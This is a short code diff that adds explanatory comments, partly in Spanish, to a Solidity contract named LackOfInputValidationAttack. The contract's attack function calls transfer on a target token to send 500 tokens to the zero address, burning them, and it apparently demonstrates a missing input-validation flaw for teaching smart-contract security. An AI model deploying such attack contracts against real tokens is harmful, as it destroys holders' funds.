@@ -6,12 +6,15 @@ interface ITokenLackOfInputValidation{
 }
 
 contract LackOfInputValidationAttack {
+    // Variables
     ITokenLackOfInputValidation public target;
 
+    // Constructor
     constructor(address _target) {
         target = ITokenLackOfInputValidation(_target);
     }
 
+    //Función de Ataque
     function attack() public {
         target.transfer(address(0), 500); // Los 500 tokens se queman
     }
